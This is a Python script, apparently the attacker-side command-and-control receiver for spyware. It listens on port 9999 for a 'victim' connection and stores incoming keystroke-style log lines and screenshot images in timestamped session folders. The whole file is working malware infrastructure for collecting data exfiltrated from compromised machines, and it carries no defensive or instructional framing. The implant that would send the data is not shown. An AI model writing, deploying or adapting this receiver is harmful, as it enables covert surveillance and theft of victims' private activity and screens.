# attacker_receiver.py
import socket
import os
import sys
import datetime

def generate_session_folder():
    """Creates a timestamped folder for this session."""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    folder_name = f"session_{timestamp}"
    os.makedirs(folder_name, exist_ok=True)
    os.makedirs(os.path.join(folder_name, "screenshots"), exist_ok=True)
    return folder_name

def main():
    # Generate unique session folder
    session_folder = generate_session_folder()
    print(f"[+] Session folder created: {session_folder}")

    # Open the unified log file
    log_file_path = os.path.join(session_folder, "full_activity.log")
    log_file = open(log_file_path, "a", encoding="utf-8")

    def log_and_print(message):
        """Print to console and write to log file."""
        print(message)
        log_file.write(message + "\n")
        log_file.flush()

    # Setup server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        s.bind(("0.0.0.0", 9999))
        s.listen(1)
        log_and_print("[+] Listening for victim on port 9999...")
    except Exception as e:
        log_and_print(f"[-] Failed to bind/listen: {e}")
        log_file.close()
        return

    try:
        conn, addr = s.accept()
        log_and_print(f"[+] Connected by {addr}")

        # Set timeout to avoid hanging
        conn.settimeout(5.0)

        # Buffer to accumulate data
        buffer = b""

        # State variables for handling binary data
        in_image_reception = False
        image_data = b""
        image_remaining = 0
        image_filename = ""

        while True:
            try:
                # Receive data in chunks
                chunk = conn.recv(4096)
                if not chunk:
                    log_and_print("[-] Connection closed by victim.")
                    break

                # Append received chunk to buffer
                buffer += chunk

                # Main loop: Process text lines unless we're in the middle of receiving an image
                while not in_image_reception and b"\n" in buffer:
                    # Split on the first newline
                    line, _, buffer = buffer.partition(b"\n")
                    # Decode the line as UTF-8, ignoring errors
                    line = line.strip().decode("utf-8", errors="ignore")

                    if line.startswith("LOG|"):
                        # Extract the log message and write it to the log
                        message = line[4:]
                        log_and_print(f"[📝 LOG] {message}")

                    elif line.startswith("IMAGE|"):
                        # Parse the image header
                        try:
                            parts = line.split("|", 2)
                            _, filename, size_str = parts
                            size = int(size_str)
                            image_filename = filename
                            log_and_print(f"[📸] Receiving image: {filename} ({size} bytes)")
                            # Switch to binary reception mode
                            in_image_reception = True
                            image_remaining = size
                            image_data = b""
                        except Exception as e:
                            log_and_print(f"[❌] Failed to parse image header: {e}")

                    else:
                        # Log any other unknown text lines
                        log_and_print(f"[📡] {line}")

                # If we are in the middle of receiving an image
                if in_image_reception:
                    # Check if we have enough data in the buffer
                    if len(buffer) >= image_remaining:
                        # Take the exact number of bytes needed for the image
                        image_data += buffer[:image_remaining]
                        # Keep the rest of the buffer for the next iteration
                        buffer = buffer[image_remaining:]

                        # Save the received image
                        image_path = os.path.join(session_folder, "screenshots", image_filename)
                        with open(image_path, "wb") as f:
                            f.write(image_data)
                        log_and_print(f"[✅] Image saved: {image_path}")

                        # Reset the image reception state
                        in_image_reception = False
                        image_remaining = 0
                        image_data = b""
                        image_filename = ""
                    else:
                        # Add the entire buffer to the image data
                        image_data += buffer
                        # Subtract the number of bytes we just consumed
                        image_remaining -= len(buffer)
                        # Clear the buffer
                        buffer = b""

            except socket.timeout:
                # Check if the connection is still alive
                try:
                    conn.send(b"")  
                except:
                    log_and_print("[-] Connection lost.")
                    break
                # No data received, continue loop
                continue

            except ConnectionResetError:
                log_and_print("[-] Connection reset by victim.")
                break

            except Exception as e:
                log_and_print(f"[💥] Unexpected error: {e}")
                break

    except Exception as e:
        log_and_print(f"[❌] Accept error: {e}")

    finally:
        log_and_print("[🛑] Receiver shutting down.")
        try:
            log_file.close()
            conn.close()
            s.close()
        except:
            pass

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[🛑] Receiver interrupted by user.")
        sys.exit(0)